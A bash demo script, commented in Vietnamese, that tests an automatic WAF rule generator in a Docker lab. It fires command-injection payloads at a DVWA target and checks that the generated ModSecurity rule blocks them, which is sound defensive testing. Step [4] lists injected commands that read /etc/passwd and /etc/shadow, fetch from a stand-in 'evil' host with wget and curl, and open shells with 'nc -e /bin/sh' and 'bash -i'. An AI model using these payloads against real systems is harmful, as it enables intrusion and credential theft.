#!/usr/bin/env bash
# tools/ruledemo.sh — DEMO vòng TỰ SINH LUẬT có kiểm chứng (một họ: RCE).
# Kịch bản: RCE chèn qua THÂN POST mà OWASP CRS bỏ lọt (giả lập bằng DetectionOnly)
#   -> classifier gán nhãn rce -> rulegen gom cụm -> luật @rx trên ARGS:ip -> kiểm chứng corpus ->
#      shadow -> active, rồi HIỂN THỊ luật và KIỂM CHỨNG nó chặn cùng họ payload từ một IP MỚI.
# Không còn bước xoá tay dữ liệu trong Elasticsearch: rulegen tự loại sự kiện 'benign' của các IP
# đã tấn công khỏi corpus kiểm chứng. Thân POST luôn được ghi (không cần bật SecAuditEngine).
# Rulegen tạm tăng tốc (chu kỳ 15s, shadow 15s) rồi trả về cấu hình gốc.
#   dùng:  bash tools/ruledemo.sh
set -u
. "$(dirname "${BASH_SOURCE[0]}")/_host.sh"      # đặt D = thư mục dự án (đường dẫn động, xem _host.sh)
NET=nsm_external_net
IMG=curlimages/curl:8.10.1
CP=(docker compose -f "$D/docker-compose.yml")
FAST="$D/.rulegen-fast.override.yml"      # tệp tạm nằm NGAY TRONG thư mục dự án, tự xoá khi script kết thúc
# ES() (gọi Elasticsearch có xác thực) được định nghĩa trong _host.sh
APACHE() { "${CP[@]}" exec -T apache sh -c "$1"; }
cleanup_demo() { docker ps -aqf "name=demo_" | xargs -r docker rm -f >/dev/null 2>&1 || true; }
restore() {
  APACHE "sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf && apache2ctl -k graceful" >/dev/null 2>&1
  "${CP[@]}" up -d rulegen >/dev/null 2>&1
  rm -f "$FAST"
}
trap 'cleanup_demo; restore' EXIT

echo ">> [1] dọn luật cũ để bắt đầu sạch (giữ nguyên corpus lành tính) ..."
"${CP[@]}" stop -t 5 rulegen >/dev/null 2>&1
"${CP[@]}" run --rm --no-deps --entrypoint sh rulegen -c 'rm -f /state/rules.json' >/dev/null 2>&1 || true
ES -X DELETE "localhost:9200/rule-status?ignore_unavailable=true" >/dev/null 2>&1
NB=$(ES "localhost:9200/web-events-*/_count?q=label:benign%20AND%20source:web&ignore_unavailable=true" | grep -o '"count":[0-9]*' | grep -o '[0-9]*')
echo "   corpus lành tính hiện có: ${NB:-0} sự kiện (rulegen cần >= MIN_BENIGN, mặc định 100)"
[ "${NB:-0}" -lt 100 ] && echo "   !! chưa đủ — để hệ thống chạy thêm vài phút (client lành tính sinh ~20 sự kiện/phút) rồi chạy lại."

echo ">> [2] tạm hạ CRS về DetectionOnly (để RCE 'lọt' cổng 2 như một payload CRS chưa biết) ..."
APACHE "sed -i 's/^SecRuleEngine .*/SecRuleEngine DetectionOnly/' /etc/modsecurity/modsecurity.conf && apache2ctl -k graceful"

echo ">> [3] tăng tốc rulegen (interval=15s, shadow=15s) ..."
cat > "$FAST" <<'YML'
services:
  rulegen:
    environment:
      INTERVAL_S: "15"
      SHADOW_S: "15"
      LOOKBACK_S: "900"
YML
if ! "${CP[@]}" -f "$FAST" up -d rulegen >/dev/null; then
  echo "!! không chạy được rulegen với cấu hình tăng tốc ($FAST) — dừng demo."; exit 1
fi
sleep 3

echo ">> [4] phóng RCE trong thân POST từ 2 IP mới (.131, .132) ..."
for ip in 131 132; do
  docker run --rm -d --name "demo_$ip" --network "$NET" --ip "10.10.10.$ip" \
    --entrypoint sh "$IMG" -c '
      T=http://10.10.10.10/vulnerabilities/exec/
      for v in "127.0.0.1;cat /etc/passwd" "127.0.0.1;cat /etc/shadow" \
               "127.0.0.1;wget http://evil/x" "127.0.0.1;curl http://evil/s" \
               "127.0.0.1;uname -a" "127.0.0.1;nc -e /bin/sh" \
               "127.0.0.1;cat /etc/hosts" "127.0.0.1;bash -i"; do
        curl -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" --data-urlencode "ip=$v" --data-urlencode "Submit=Submit" "$T"
      done' >/dev/null
done

echo ">> [5] chờ rulegen gom cụm -> shadow -> active (tối đa ~150s) ..."
OK=""
for i in $(seq 1 30); do
  sleep 5
  ST=$(ES "localhost:9200/rule-status/_search?size=5&sort=@timestamp:desc&ignore_unavailable=true" 2>/dev/null)
  states=$(echo "$ST" | grep -o '"state":"[a-z]*"' | tr '\n' ' ')
  echo "   ...$((i*5))s  trạng thái luật: ${states:-(chưa có)}"
  echo "$ST" | grep -q '"state":"active"' && { OK=1; break; }
done
cleanup_demo

echo
echo "===================== LUẬT ĐÃ SINH (active.conf) ====================="
APACHE 'cat /etc/modsecurity/autogen/active.conf'
echo "---------------------- rule-status (ES) ----------------------"
ES "localhost:9200/rule-status/_search?size=5&sort=@timestamp:desc&_source=id,class,op,target,state,reason,cluster_size,token&pretty" 2>/dev/null

echo
if [ -n "$OK" ]; then
  echo ">> [6] bật lại SecRuleEngine=On để luật tự sinh thực thi ..."
  APACHE "sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf && apache2ctl -k graceful"
  sleep 2
N0=$(APACHE "wc -l < /var/log/apache-json/modsec_audit.json" 2>/dev/null | tr -dc 0-9)
  echo ">> KIỂM CHỨNG: gửi 1 RCE dùng 'id' (payload CHƯA từng gửi) từ IP mới (.140) -> kỳ vọng 403 ..."
  C=$(docker run --rm --network "$NET" --ip 10.10.10.140 "$IMG" -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" -w "%{http_code}" \
       --data-urlencode "ip=127.0.0.1;id" --data-urlencode "Submit=Submit" "http://10.10.10.10/vulnerabilities/exec/" 2>/dev/null)
  echo "   mã trả về = $C   (403 = luật tự sinh đã chặn)"
  B=$(docker run --rm --network "$NET" --ip 10.10.10.141 "$IMG" -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" -w "%{http_code}" \
       --data-urlencode "ip=8.8.8.8" --data-urlencode "Submit=Submit" "http://10.10.10.10/vulnerabilities/exec/" 2>/dev/null)
  echo "   đối chứng: request LÀNH TÍNH (ip=8.8.8.8) từ IP mới (.141) = $B   (kỳ vọng KHÁC 403)"
else
  echo ">> [6] CHƯA thấy luật 'active' trong thời gian chờ. Xem log:  docker compose logs --tail 40 rulegen"
fi

echo "   luật TỰ SINH đã khớp trong các request kiểm chứng (theo nhật ký kiểm toán ModSecurity):"
sleep 2
APACHE "tail -n +$(( ${N0:-0} + 1 )) /var/log/apache-json/modsec_audit.json | grep -o 'autogen [a-z]* active' | sort | uniq -c" 2>/dev/null | sed 's/^/     /' || true
echo
echo ">> [7] khôi phục cấu hình (SecRuleEngine On + rulegen về chu kỳ gốc) ..."
echo ">> xong. Reset luật về none cho lượt sau:  bash tools/reset-all.sh"
